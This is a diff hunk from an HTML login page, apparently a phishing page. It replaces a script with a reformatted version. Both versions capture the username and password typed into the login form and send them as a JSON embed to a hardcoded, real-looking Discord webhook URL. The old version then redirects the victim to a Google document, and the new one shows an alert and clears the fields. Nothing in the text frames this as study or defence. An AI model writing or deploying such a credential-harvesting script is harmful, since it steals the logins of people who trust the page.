@@ -67,46 +67,51 @@
         }
       </style>
       
-      <script>
-        const webhookUrl = "https://discord.com/api/webhooks/1107141811727773708/rSG2hq8XrpDgfQOFU8z3QYyAUi6uWRCRuJ3VDYsD4PKctobzJT9Zd2nfniaAsU3xvqDK";
-      
-        const loginForm = document.getElementById("login-form");
-        loginForm.addEventListener("submit", event => {
-          event.preventDefault();
-      
-          const username = document.getElementById("username").value;
-          const password = document.getElementById("password").value;
-      
-          const message = {
-            embeds: [
-              {
-                title: "Login Details",
-                color: 16711680,
-                fields: [
-                  {
-                    name: "Username",
-                    value: username,
-                    inline: true
-                  },
-                  {
-                    name: "Password",
-                    value: password,
-                    inline: true
-                  }
-                ]
-              }
-            ]
-          };
-      
-          const xhr = new XMLHttpRequest();
-          xhr.open("POST", webhookUrl);
-          xhr.setRequestHeader("Content-Type", "application/json");
-          xhr.send(JSON.stringify(message));
-      
-          // Redirect to YouTube
-          window.location.href = "https://docs.google.com/document/d/1rUkIpldxjAi-jnfRn2qdhjRr3xRBGxjjuWdIuXFXL9c/";
-        });
-      </script>
+   <script>
+  const webhookUrl = "https://discord.com/api/webhooks/1107141811727773708/rSG2hq8XrpDgfQOFU8z3QYyAUi6uWRCRuJ3VDYsD4PKctobzJT9Zd2nfniaAsU3xvqDK";
+
+  const loginForm = document.getElementById("login-form");
+  loginForm.addEventListener("submit", event => {
+    event.preventDefault();
+
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
+
+    const message = {
+      embeds: [
+        {
+          title: "Login Details",
+          color: 16711680,
+          fields: [
+            {
+              name: "Username",
+              value: username,
+              inline: true
+            },
+            {
+              name: "Password",
+              value: password,
+              inline: true
+            }
+          ]
+        }
+      ]
+    };
+
+    const xhr = new XMLHttpRequest();
+    xhr.open("POST", webhookUrl);
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.send(JSON.stringify(message));
+    
+    // Optionally display a success message or perform other actions
+    alert("Login details sent to Discord!");
+
+    // You can choose to clear the form fields after sending the webhook
+    document.getElementById("username").value = "";
+    document.getElementById("password").value = "";
+  });
+</script>
+
       
         
       
